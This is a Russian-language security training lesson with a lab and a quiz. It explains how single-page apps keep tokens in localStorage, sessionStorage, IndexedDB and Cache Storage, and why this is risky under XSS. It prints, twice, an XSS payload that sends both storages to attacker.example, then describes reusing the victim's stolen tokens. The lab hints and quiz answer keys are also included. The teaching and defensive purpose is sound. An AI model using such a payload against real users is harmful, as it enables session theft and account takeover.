---
id: web-webstorage
title: "Web Storage, IndexedDB и клиентские утечки"
category: web
parent: web-cookies-sessions
difficulty: easy
order: 1
tags: [webstorage, localstorage, sessionstorage, indexeddb, xss, tokens]
prerequisites: [web-cookies-sessions, web-xss]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
estimated_minutes: 40
summary: "Где SPA хранят токены и сессии, чем это опасно при XSS и как читать/анализировать клиентское хранилище."
lab:
  kind: shell
  title: "Практика: токен в localStorage"
  toolset: [core, curl]
  workdir: /home/student/task
  files: [task.md, localstorage_dump.txt, access_token.jwt]
  check: "grep -q 'nto{' found.txt"
  hints:
    - "Посмотри дамп хранилища: cat localstorage_dump.txt"
    - "SPA хранит access_token (JWT) прямо в localStorage — при XSS его прочитает любой скрипт."
    - "JWT состоит из трёх частей через точку: header.payload.signature."
    - "Декодируй payload: cut -d. -f2 access_token.jwt | base64 -d > found.txt, затем check."

---

Мы уже знаем: сессия обычно живёт в cookie, и `HttpOnly` защищает её от JavaScript. Но современные одностраничные приложения (SPA) часто хранят токены **не в cookie**, а в браузерном хранилище — `localStorage`. Разработчики считают это безопасным: «токен не отправляется автоматически, значит, CSRF невозможен». Проблема в том, что от XSS это не спасает совсем.

В этом уроке мы возьмём SPA-версию `shop.local` и посмотрим, **где** она держит токен и что произойдёт при XSS.

## Наш пример: токен в localStorage

Откроем `shop.local`, залогинимся и заглянем в браузерное хранилище. В консоли (F12 → Console) выполним:

```js
> Object.entries(localStorage)
[["access_token","eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.9x2..."],
 ["refresh_token","8f3a1c9d7b2e..."],
 ["cart","[{...}]"]]
```

Приложение положило в `localStorage` **access-токен** и **refresh-токен**. Разберёмся, что это за хранилище и чем оно отличается от cookie.

## Шаг 1: Web Storage против cookie

**Web Storage** — это объекты `localStorage` и `sessionStorage`, которые браузер даёт JavaScript. Различие с cookie принципиальное:

- **Cookie** автоматически отправляются с каждым HTTP-запросом. Их можно защитить флагом `HttpOnly` — тогда JS их не прочитает.
- **Web Storage** никогда не уходит на сервер сам по себе: чтобы отправить данные, нужен явный `fetch`. И **у Web Storage нет `HttpOnly`** — такого механизма не существует.

Отсюда два вывода. Первый: `localStorage` **не защищён от XSS вообще** — любой внедрённый скрипт читает его целиком. Второй: хранить в нём долгоживущий refresh-токен — опасная практика, потому что одна XSS превращается в полный захват аккаунта надолго.

Отличия трёх хранилищ:

| Хранилище | Живёт | Доступ |
|-----------|-------|--------|
| `localStorage` | до очистки, общий для всех вкладок | любой скрипт на origin |
| `sessionStorage` | до закрытия вкладки | скрипты этой вкладки |
| `IndexedDB` | до очистки | любой скрипт на origin (асинхронная БД) |

## Шаг 2: что искать в хранилище

При аудите первым делом смотришь DevTools → Application → Storage. Ищешь:

- токены (JWT, access/refresh);
- идентификаторы сессий;
- персональные данные (email, телефон, адрес);
- платёжную информацию;
- кэш приватных API-ответов;
- черновики и «временные» секреты (API-ключи сторонних сервисов).

```js
// вывести всё содержимое хранилищ
Object.entries(localStorage).forEach(([k,v]) => console.log(k,'=',v.slice(0,120)));
Object.entries(sessionStorage).forEach(([k,v]) => console.log(k,'=',v.slice(0,120)));
```

## Шаг 3: кража через XSS

Теперь найдём в нашем магазине XSS. В поиске есть отражение:

```bash
$ curl -s 'https://shop.local/search?q=<script>alert(1)</script>' | grep -o '<script>alert(1)</script>'
<script>alert(1)</script>
```

Отражается без экранирования — это XSS. Соберём payload, который читает хранилище и отправляет его на наш сервер:

```html
<script>
  fetch('https://attacker.example/collect', {
    method:'POST',
    body: JSON.stringify({ls:{...localStorage}, ss:{...sessionStorage}})
  });
</script>
```

Отправим его жертве (или откроем сами) — на `attacker.example` придут токены:

```
POST /collect
{"ls":{"access_token":"eyJ...","refresh_token":"8f3a..."},"ss":{}}
```

Вот и артефакт: чужие токены у тебя на сервере. С `access_token` ты делаешь запросы от имени жертвы, а с `refresh_token` — обновляешь доступ даже после того, как она сменит пароль.

## Шаг 4: общее устройство и persistence

`localStorage` **не очищается** при закрытии браузера и часто не очищается при выходе из аккаунта. На общем компьютере следующий пользователь может открыть DevTools и прочитать токены:

```js
// если приложение не чистит хранилище при logout — данные остаются
> localStorage.getItem('access_token')
"eyJhbGciOiJIUzI1NiJ9..."
```

Проверяй это: залогинься, выйди, посмотри, осталось ли что-то в `localStorage` и `sessionStorage`. Незачищенный `refresh_token` после logout — отдельная находка.

Ещё один канал — **сторонние скрипты**. Аналитика, реклама, виджеты исполняются на твоём origin и имеют полный доступ к хранилищу. Их компрометация (supply-chain) — это чтение всех данных:

```bash
$ curl -s 'https://shop.local/' | grep -oE '<script[^>]+src="https?://[^"]+"' | sort -u
<script src="https://cdn.analytics.example/a.js">
```

## Шаг 5: как правильно

Безопасная схема: короткоживущий access-токен держат **в памяти** (переменная JS), а refresh-токен — в `HttpOnly; Secure; SameSite` cookie. Тогда XSS даёт максимум временный доступ, а не бессрочный. Чувствительные данные не кэшируют в хранилище без нужды, а при logout очищают всё:

```js
localStorage.clear();
sessionStorage.clear();
```

И главное — закрывать XSS, потому что именно она превращает любое клиентское хранилище в канал утечки.

## Шаг 6: IndexedDB и Cache Storage

Кроме `localStorage` есть более вместительные хранилища. **IndexedDB** — полноценная асинхронная БД в браузере; SPA кэшируют там сообщения, заказы, черновики. Читается она так же легко:

```js
const req = indexedDB.open('shop');
req.onsuccess = () => {
  req.result.transaction('orders').objectStore('orders').getAll()
    .onsuccess = e => console.log(e.target.result);
};
```

**Cache Storage** — кэш Service Worker'а, который перехватывает сетевые запросы и может хранить приватные ответы API, переживающие logout:

```js
caches.keys().then(ks => ks.forEach(k => caches.open(k).then(c => c.keys().then(r => console.log(k, r)))));
```

Скомпрометированный Service Worker способен перехватывать весь трафик origin — это отдельный усилитель XSS.

## Справочная таблица хранилищ

| Хранилище | Живёт | Доступ | Риск |
|-----------|-------|--------|------|
| cookie (`HttpOnly`) | по `Max-Age` | не видно JS | защищено от XSS |
| cookie (без `HttpOnly`) | по `Max-Age` | видно JS | XSS крадёт |
| `localStorage` | до очистки | любой скрипт origin | XSS / общее устройство |
| `sessionStorage` | до закрытия вкладки | скрипты вкладки | XSS |
| `IndexedDB` | до очистки | любой скрипт origin | XSS, кэш приватных данных |
| Cache Storage (SW) | до очистки | JS/SW | приватные ответы |

Почему `localStorage` вообще стал стандартом для токенов? Потому что он прост, синхронен и **не отправляется автоматически** — значит, CSRF как будто невозможен. Но аргумент «не уходит с запросами» обманчив: cookie можно защитить флагом `HttpOnly`, а `localStorage` — нельзя. При XSS cookie остаётся недоступной, а токен в `localStorage` утекает. Это принципиальная разница: `HttpOnly` превращает XSS в «действия от имени пользователя, пока он на странице», а `localStorage` — в «украденный токен, действующий вечно».

## Полный прогон: от хранилища до захвата

1. В DevTools видим `access_token` и `refresh_token` в `localStorage`.
2. Находим отражённую XSS в `?q=`.
3. Собираем payload, читающий хранилище:

```html
<script>
  fetch('https://attacker.example/collect', {
    method:'POST',
    body: JSON.stringify({ls:{...localStorage}, ss:{...sessionStorage}})
  });
</script>
```

4. Отправляем ссылку жертве → получаем токены.
5. С `access_token` делаем запросы от её имени, с `refresh_token` — обновляем доступ даже после смены пароля.

Артефакт — токены жертвы на нашем сервере и успешный вход с ними.

## Что мы теперь знаем

- Web Storage (`localStorage`, `sessionStorage`, IndexedDB) доступен любому скрипту на origin.
- У Web Storage нет `HttpOnly` — от XSS он не защищён.
- Токен в `localStorage` = при XSS полный и долгий захват аккаунта.
- Хранилище может не очищаться при logout — риск на общих устройствах.
- Правильно: access-токен в памяти, refresh-токен в `HttpOnly` cookie.

## На что смотреть дальше

- **Очистка при logout.** Проверь, остаются ли токены в хранилищах после выхода.
- **Сторонние скрипты.** Аналитика и виджеты читают всё хранилище — их компрометация = утечка.
- **Кэш приватных ответов.** Если IndexedDB/Cache содержит чужие данные, это находка сама по себе.

## Квиз

Выбери один вариант в каждом вопросе.

```quiz
- question: "Какое хранилище недоступно из JavaScript?"
  options:
    - "`localStorage`"
    - "`sessionStorage`"
    - "Cookie с флагом `HttpOnly`"
    - "`IndexedDB`"
  answer: 2
  explanation: "`HttpOnly` прячет cookie от JS; остальные доступны."
- question: "Чем опасен токен в `localStorage`?"
  options:
    - "Любая XSS читает его"
    - "Он ускоряет сайт"
    - "Он блокирует CORS"
    - "Он шифрует данные"
  answer: 0
  explanation: "Нет `HttpOnly` — JS на origin имеет полный доступ."
- question: "До какого момента живёт `sessionStorage`?"
  options:
    - "До закрытия вкладки"
    - "Вечно"
    - "До смены пароля"
    - "До перезагрузки сервера"
  answer: 0
  explanation: "`sessionStorage` привязан к вкладке/сессии."
- question: "Какая комбинация cookie безопаснее для сессии?"
  options:
    - "`HttpOnly; Secure; SameSite`"
    - "без флагов"
    - "только `Secure`"
    - "только `SameSite=None`"
  answer: 0
  explanation: "`HttpOnly`+`Secure`+`SameSite` закрывает и кражу JS, и часть CSRF."
- question: "Что часто хранят в IndexedDB SPA?"
  options:
    - "Кэш данных и токены"
    - "Только картинки"
    - "Ничего"
    - "Сертификаты TLS"
  answer: 0
  explanation: "IndexedDB вместительна и хранит оффлайн-данные/токены."
```

## Куда дальше

Мы увидели, что клиентское хранилище — лёгкая добыча при XSS. А теперь вернёмся к сессии на сервере и разберём **фиксацию сессии** как самостоятельную атаку — со своим PoC и чек-листом. А пока запомни: **всё, что доступно JS, доступно и XSS; токены лучше держать там, куда JS не дотянется.**

## Где пригодится

- **CTF (Web):** задачи, где флаг или токен лежит в `localStorage` и крадётся через XSS.
- **Bug bounty:** хранение токенов в JS-доступном месте + XSS = кража сессии.
- **Пентест:** аудит SPA-хранилищ и жизненного цикла токенов.
- **Работа (AppSec/Dev):** выбор cookie `HttpOnly` для сессий, короткие access-токены, очистка при logout.
